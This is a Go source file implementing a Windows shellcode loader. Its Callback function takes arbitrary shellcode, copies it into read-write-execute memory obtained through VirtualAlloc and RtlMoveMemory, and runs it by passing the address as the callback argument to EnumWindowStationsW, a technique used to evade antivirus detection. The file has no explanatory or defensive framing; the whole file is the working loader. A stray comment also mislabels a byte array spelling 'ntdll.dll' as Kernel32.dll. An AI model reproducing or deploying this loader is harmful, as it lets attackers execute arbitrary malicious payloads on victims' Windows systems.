package TT

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	User32              = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	EnumWindowStationsW = User32.MustFindProc("EnumWindowStationsW")
	RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	//p1 := []byte{110, 116, 100, 108, 108, 46, 100, 108, 108, 0} // Kernel32.dll
	EnumWindowStationsW.Call(addr, 0)
}
